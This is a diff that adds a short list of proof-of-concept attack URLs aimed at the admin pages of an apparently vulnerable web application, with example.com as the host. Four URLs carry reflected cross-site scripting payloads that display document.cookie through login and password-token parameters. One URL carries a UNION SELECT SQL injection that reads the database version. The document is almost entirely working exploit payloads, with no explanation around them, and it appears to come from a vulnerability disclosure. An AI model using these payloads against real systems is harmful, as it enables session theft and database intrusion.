@@ -1,0 +1,8 @@
+http://www.example.com/admin/login.php?error_code=upgrade&amp;f_user_name=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E 
+
+http://www.example.com/admin/password_check_token.php?token=1&amp;f_email=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+http://www.example.com/admin/password_check_token.php?f_email=1&amp;token=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E 
+
+http://www.example.com/admin/ad.php?Back=%27%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E 
+
+http://www.example.com/admin/country/edit.php?f_country_code=%27%20union%20select%201,2,version%28%29%20--%202 
